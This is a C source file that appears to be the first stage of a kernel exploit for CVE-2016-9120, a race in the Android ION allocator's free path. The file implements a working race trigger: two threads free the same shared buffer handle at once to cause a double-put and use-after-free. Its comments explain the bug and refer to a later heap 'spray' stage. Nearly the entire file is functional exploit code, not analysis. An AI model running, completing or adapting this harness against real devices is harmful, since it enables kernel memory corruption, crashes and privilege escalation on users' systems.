#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

/* CVE-2016-9120 race harness -- MEASUREMENT pass only (no spray yet).
 *
 * Per attempt:
 *   ALLOC (heap bit 9)                -> handle h1   (buffer refcount = 1)
 *   SHARE -> fd ; IMPORT fd -> h2     -> handle h2   (buffer refcount = 2)
 *   two threads FREE(h1) simultaneously
 * The unpatched ion_free() validates the handle under client->lock, drops the
 * lock, then puts -- so both threads can pass validation and the buffer gets
 * put twice while h2 still references it. That is the premature free we later
 * spray. Here we only measure whether the window opens at all.
 *
 * Correlation oracle: /sys/kernel/debug/ion/heaps/system is world-readable.
 * Crash is acceptable (user-approved); the goal of this pass is the hit rate.
 */
#define ION_ALLOC  0xc0204900u   /* I nr0 size32 */
#define ION_FREE   0xc0044901u   /* I nr1 size4  (int handle -- binary-derived) */
#define ION_SHARE  0xc0084904u   /* I nr4 size8  */
#define ION_IMPORT 0xc0084905u   /* I nr5 size8  */

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };
struct fd_data { unsigned handle; int fd; };

static int g_fd;
static volatile int g_go, g_done0, g_done1;
static unsigned g_h;

static void *hammer(void *arg)
{
    long me = (long)arg;
    volatile int *mine = me ? &g_done1 : &g_done0;
    unsigned h = g_h;
    int rc, i;
    while (!g_go)
        sched_yield();
    for (i = 0; i < 8; i++) {                  /* several shots per window */
        errno = 0;
        rc = ioctl(g_fd, ION_FREE, &h);
        if (rc && errno != EINVAL && errno != ENODEV) {
            printf("    [t%ld] FREE rc=%d errno=%d(%s)\n", me, rc, errno, strerror(errno));
            break;
        }
    }
    *mine = 1;
    return NULL;
}

int main(int argc, char **argv)
{
    int attempts = argc > 1 ? atoi(argv[1]) : 200;
    int i, odd = 0;
    unsigned long long refcount_hits = 0;

    g_fd = open("/dev/ion", O_RDONLY);
    if (g_fd < 0) { perror("open /dev/ion"); return 1; }
    printf("pid=%d fd=%d  attempts=%d\n", getpid(), g_fd, attempts);

    for (i = 0; i < attempts; i++) {
        struct alloc_data ad;
        struct fd_data sd, idd;
        pthread_t th[2];
        int rc;

        memset(&ad, 0, sizeof ad);
        ad.len = 0x2000; ad.align = 4096; ad.mask = 1u << 9;
        errno = 0;
        if (ioctl(g_fd, ION_ALLOC, &ad)) { printf("alloc fail %s\n", strerror(errno)); break; }

        memset(&sd, 0, sizeof sd); sd.handle = ad.handle;
        errno = 0;
        if (ioctl(g_fd, ION_SHARE, &sd)) {
            printf("share fail errno=%d(%s)\n", errno, strerror(errno));
            rc = ad.handle; ioctl(g_fd, ION_FREE, &rc);
            continue;
        }
        memset(&idd, 0, sizeof idd); idd.fd = sd.fd;
        errno = 0;
        if (ioctl(g_fd, ION_IMPORT, &idd)) {
            printf("import fail errno=%d(%s)\n", errno, strerror(errno));
            close(sd.fd);
            rc = ad.handle; ioctl(g_fd, ION_FREE, &rc);
            continue;
        }

        g_h = ad.handle;                       /* free h1 from both threads */
        g_go = 0; g_done0 = g_done1 = 0;
        pthread_create(&th[0], NULL, hammer, (void *)0L);
        pthread_create(&th[1], NULL, hammer, (void *)1L);
        sched_yield();
        g_go = 1;
        while (!g_done0 || !g_done1)
            sched_yield();
        pthread_join(th[0], NULL);
        pthread_join(th[1], NULL);

        /* h2 must still be valid if the double-put already dropped the buffer */
        rc = idd.handle;
        errno = 0;
        int r2 = ioctl(g_fd, ION_FREE, &rc);
        if (r2 || errno != 0) {
            odd++;
            if (odd <= 12)
                printf("attempt %d: h1=%u h2=%u  second-handle FREE rc=%d errno=%d(%s)\n",
                       i, ad.handle, idd.handle, r2, errno, strerror(errno));
        }
        close(sd.fd);
        refcount_hits++;
    }
    printf("\nattempts=%llu  odd-second-handle-results=%d\n", refcount_hits, odd);
    printf("check dmesg now: invalid handle / refcount / Unable to handle kernel\n");
    close(g_fd);
    return 0;
}
